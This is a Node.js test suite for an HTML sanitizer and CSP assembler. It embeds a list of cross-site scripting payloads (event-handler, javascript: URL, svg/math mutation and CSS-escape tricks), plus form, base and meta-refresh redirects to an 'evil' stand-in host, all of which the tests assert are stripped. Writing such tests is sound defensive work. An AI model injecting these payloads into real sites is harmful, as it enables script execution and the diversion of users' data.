import { test } from "node:test";
import assert from "node:assert/strict";
import { sanitize, assemble, scan, decodeEntities, CSP } from "./webpage.mjs";

const O = { images: ["images/a.jpg"], fallbackImage: "images/a.jpg" };
const PAYLOADS = [
  `<img/src=x/onerror=alert(1)>`, `<img src="images/a.jpg"/onerror=alert(1)>`, `<svg/onload=alert(1)>`,
  `<svg><script>alert(1)</script></svg>`, `<a href="java&#9;script:alert(1)">x</a>`, `<a href="&#106;avascript:alert(1)">x</a>`,
  `<a href="java\nscript:alert(1)">x</a>`, `<a href=" javascript:alert(1)">x</a>`, `<a href=javascript:alert(1)>x</a>`,
  `<a href="&#x6A;avascript&colon;alert(1)">x</a>`, `<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`,
  `<a href=# on onclick=alert(1)>x</a>`, `<button formaction=https://evil>x</button>`, `<img src=//evil/x.png onerror=alert(1)>`,
  `<scr<script></script>ipt>alert(1)</script>`, `<svg><style><img src=x onerror=alert(1)></style></svg>`,
  `<template><script>alert(1)</script></template>`, `<noscript><style></noscript><img src=x onerror=alert(1)>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
  `<svg><animate attributeName=href values=javascript:alert(1) /></svg>`, `<object data="javascript:alert(1)"></object>`,
  `<!--><script>alert(1)</script>-->`, `<!-- <head> --><img/src=x/onerror=alert(1)>`, `<meta http-equiv=refresh content="0;url=https://evil">`,
  `<iframe srcdoc="<script>1</script>" src="https://www.google.com/maps/embed?x"></iframe>`, `<base href="https://evil/">`,
  `<form action=https://evil><input name=x></form>`, `<a href="https://x" target=_blank onmouseover=1>x</a>`,
];

// Everything a browser could execute or load, looked for in the tokenized output (not with one big regex).
function dangers(out) {
  const found = [];
  for (const t of scan(out)) {
    if (t.t !== "start") continue;
    if (["script", "object", "embed", "base", "form", "input", "textarea", "foreignobject", "animate", "set", "math"].includes(t.name)) {
      if (!(t.name === "script" && t.attrs.length === 2)) found.push(t.name);
    }
    for (const a of t.attrs) {
      if (/^on/.test(a.name)) found.push(a.name);
      if (["href", "xlink:href", "src"].includes(a.name) && /^[a-z][a-z0-9+.-]*:/i.test(decodeEntities(a.value).replace(/[\u0000-\u0020]/g, "")) && !/^(https?|mailto|tel):/i.test(decodeEntities(a.value).replace(/[\u0000-\u0020]/g, ""))) found.push(a.name + "=" + a.value);
      if (["srcset", "srcdoc", "formaction", "action", "http-equiv"].includes(a.name)) found.push(a.name);
    }
  }
  return found;
}

test("every probe payload comes out without handlers, script URLs or script-capable elements", () => {
  for (const p of PAYLOADS) {
    const out = sanitize(`<html><head><title>t</title></head><body>${p}</body></html>`, O);
    assert.deepEqual(dangers(out), [], `${p} -> ${out}`);
    assert.doesNotMatch(out, /evil/, `${p} -> ${out}`);
  }
});

test("img with unquoted/odd src is replaced by the fallback", () => {
  const out = sanitize(`<img src=//evil/x.png alt=a>`, O);
  assert.equal(out, `<img alt="a" src="images/a.jpg">`);
});

test("CSS tricks are neutralised", () => {
  const css = [`@import 'https://evil/x.css';`, `a{background:image-set('https://evil/x' 1x)}`, `a{background:src("https://evil/x")}`, `a{background:\\75rl(https://evil/x)}`, `a{background:u\\72l(https://evil/x)}`, `a{background:url( https://evil/x )}`, `a{width:expression(alert(1))}`];
  for (const c of css) {
    const out = sanitize(`<style>${c}</style><div style="${c.replace(/"/g, "'")}">`, O);
    assert.doesNotMatch(out, /(url|image-set|src|expression|import)\s*\(|@import|\\75|u\\72l/i, `${c} -> ${out}`);
  }
  assert.match(sanitize(`<style>@import url("https://fonts.googleapis.com/css2?family=Inter");</style>`, O), /fonts\.googleapis\.com/);
  assert.match(sanitize(`<style>i:before{content:"\\f101"}</style>`, O), /\\f101/, "legit escapes are kept");
});

test("link, iframe and script allow-lists use exact hosts", () => {
  const out = sanitize(`<link rel=stylesheet href="https://fonts.googleapis.com@evil.com/x.css"><link rel=preload as=script href="https://fonts.googleapis.com/x.js"><link rel=stylesheet href="https://fonts.googleapis.com.evil.com/x.css"><iframe src="https://www.google.com/url?q=https://evil&maps?"></iframe><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" onload="alert(1)">x</script>`, O);
  assert.doesNotMatch(out, /evil|<link|<iframe|onload|alert/);
  assert.match(out, /<script src="https:\/\/cdn\.jsdelivr\.net\/npm\/bootstrap@5\.3\.3\/dist\/js\/bootstrap\.bundle\.min\.js" defer><\/script>/);
});

test("the CSP meta is the first child of the real head even when comments mention <head>", () => {
  const raw = `<!doctype html><html lang="es"><!-- <head> --><head><title>x</title></head><body><h1>x</h1><img/src=x/onerror=fetch('/api/studio')><svg/onload=alert(1)></body></html>`;
  const out = assemble(sanitize(raw, O), { lang: "es", langs: ["es"], urls: { es: "https://x/" }, title: "t", description: "d" });
  assert.doesNotMatch(out, /<!--/);
  const toks = scan(out);
  const headIdx = toks.findIndex((t) => t.t === "start" && t.name === "head");
  const first = toks.slice(headIdx + 1).find((t) => t.t === "start" || t.t === "end");
  assert.equal(out.slice(first.s, first.e).startsWith('<meta http-equiv="Content-Security-Policy"'), true);
  assert.equal(toks.filter((t) => t.t === "start" && t.name === "head").length, 1);
  assert.deepEqual(dangers(out).filter((d) => d !== "script" && d !== "http-equiv"), []);
});

test("assemble defends itself against raw input: comments, fake heads, model CSP/refresh/base", () => {
  const raw = `<html onload=x()><!-- <head> --><meta http-equiv="refresh" content="0;url=https://evil"><base href="//evil/"><textarea><head></textarea><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body onload=y()><img src=x onerror=z()></body></html>`;
  const out = assemble(raw, { lang: "en", langs: ["en"], urls: { en: "https://x/" }, title: "t", description: "d" });
  assert.doesNotMatch(out, /refresh|<base|textarea|onload|onerror|default-src \*|evil|<!--/);
  assert.equal((out.match(/Content-Security-Policy/g) ?? []).length, 1);
  assert.ok(out.indexOf("Content-Security-Policy") < out.indexOf("<body"));
});

test("CSP pins the script to the exact Bootstrap bundle", () => {
  assert.match(CSP, /script-src https:\/\/cdn\.jsdelivr\.net\/npm\/bootstrap@5\.3\.3\/dist\/js\/bootstrap\.bundle\.min\.js;/);
  assert.doesNotMatch(CSP, /script-src[^;]*unsafe/);
});

test("fuzz: random comment/CDATA/template/svg wrapping never yields handlers", () => {
  let seed = 7;
  const rnd = (n) => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) % n;
  const wraps = [(s) => `<!--${s}-->`, (s) => `<![CDATA[${s}]]>`, (s) => `<template>${s}</template>`, (s) => `<svg>${s}</svg>`, (s) => `<math>${s}</math>`, (s) => `<noscript>${s}</noscript>`, (s) => `<!-->${s}`, (s) => `<a href="x">${s}</a>`, (s) => s];
  for (let i = 0; i < 300; i++) {
    let s = PAYLOADS[rnd(PAYLOADS.length)];
    for (let k = rnd(4); k >= 0; k--) s = wraps[rnd(wraps.length)](s);
    const out = sanitize(`<html><head></head><body>${s}</body></html>`, O);
    assert.deepEqual(dangers(out), [], `${s} -> ${out}`);
  }
});
